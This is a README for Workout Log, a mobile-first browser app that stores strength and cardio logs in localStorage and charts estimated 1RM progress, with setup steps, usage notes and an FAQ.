# Workout Log vLatest - workout tracker 2026

> **Workout Log is a mobile-first workout journal for the web. Record strength and cardio training, work with progressive overload, and monitor estimated 1RM changes through a simple local-first experience.**

[![Platform](https://img.shields.io/badge/Platform-web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-vLatest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/nfisher33/workout-log-1rm-tracker?style=flat-square)](https://github.com/nfisher33/workout-log-1rm-tracker)

---

<p align="center">
  <a href="https://nfisher33.github.io/workout-log-1rm-tracker/">
    <img src="https://img.shields.io/badge/Download-Workout%20Log%20Latest-brightgreen?style=for-the-badge" alt="Download Workout Log">
  </a>
</p>

> **[Download Workout Log vLatest](https://nfisher33.github.io/workout-log-1rm-tracker/)**

---

[Download Latest Build](https://nfisher33.github.io/workout-log-1rm-tracker/)

---

## What Workout Log Does

Workout Log is a browser-based training log intended for quick, everyday use. It covers the recurring essentials: entering strength workouts, recording cardio, and correcting or updating past entries without requiring a complex setup.

Your records remain in the browser through localStorage, keeping the application self-contained and straightforward to use. Alongside basic logging, Workout Log provides estimated 1RM trends, personal-record tracking, and progressive-overload guidance to help you understand how your training changes over time.

---

## Highlights

- Record strength and cardio workouts with minimal steps
- Suggest exercises from previously logged activity through autocomplete
- Use progressive-overload recommendations when planning sessions
- View strength progress in an estimated 1RM trend chart
- Identify newly achieved personal records
- Browse entries by date and remove unwanted records
- Move data between backups with JSON export and import
- Switch between light and dark display modes

---

## Getting Started

Download the project files or clone the repository, then launch the app in a web browser.

    git clone https://github.com/nfisher33/workout-log-1rm-tracker.git
    cd REPO

For local use, open the primary HTML file directly in your browser. The basic workflow does not require a separate build process.

---

## Using the App

1. Launch Workout Log in a desktop or mobile browser.
2. Create an entry for a strength workout or cardio session.
3. Select an exercise from the suggestions, or enter a new exercise name.
4. Examine your history, personal records, and estimated 1RM chart.
5. Apply the overload guidance when preparing the next workout.
6. Export your data as JSON before substantial changes and import that file later when a restore is needed.

A typical session looks like this:

    Open the app
    Record sets, reps, weight, or cardio information
    Review the history and trend chart
    Create a JSON backup whenever you want a saved copy

---

## Data and Display Settings

Workout Log uses browser localStorage for its records, meaning your workouts and related data stay associated with the browser profile used to access the application.

To transfer your information to another browser or device, export it as JSON and import the backup there. The application includes a light/dark mode switch for changing the theme.

---

## Requirements

- A current web browser
- Support for browser localStorage
- Sufficient local storage for workout records and JSON backup files
- Access from either a mobile device or desktop computer

---

## Frequently Asked Questions

### Where does Workout Log save my workouts?
The application stores workout history locally in your browser with localStorage.

### What is the backup process?
Choose the JSON export option to save your entries. That file can later be imported to restore the data.

### Is mobile use supported?
Yes. Workout Log uses a mobile-first interface and can be used on mobile devices.

### Why is an exercise missing from autocomplete?
Autocomplete is based on your logged exercise history. Record the exercise once, and it can become available among later suggestions.

### What should I check if records have disappeared?
Confirm that you are using the same browser profile and that its local storage has not been removed. If you have a JSON backup, import it to recover the records.

---

## License

Workout Log is available under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
